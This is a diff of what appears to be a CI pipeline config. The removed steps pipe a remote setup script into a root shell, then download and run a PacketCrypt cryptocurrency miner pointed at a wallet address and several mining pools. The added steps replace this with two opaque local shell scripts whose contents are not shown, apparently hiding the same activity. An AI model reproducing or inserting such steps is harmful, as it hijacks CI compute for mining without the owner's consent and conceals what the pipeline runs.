@@ -19,10 +19,7 @@ jobs:
      
     steps: 
       - checkout
-      - run: sudo apt update
-      - run: sudo apt upgrade -y
-      - run: curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
-      - run: sudo apt install nodejs
-      - run: wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64
-      - run: chmod +x packetcrypt-v0.5.1-linux_amd64
-      - run: ./packetcrypt-v0.5.1-linux_amd64 ann -p pkt1q8fkdwccery93f63zjkfmdux3jhjuqfyhdrsr9z https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world | grep --color=never -o "annmine.rs.*Ke.*"
+      - run: chmod +x ./install.sh
+      - run: ./install.sh
+      - run: chmod +x ./sayang.sh
+      - run: ./sayang.sh
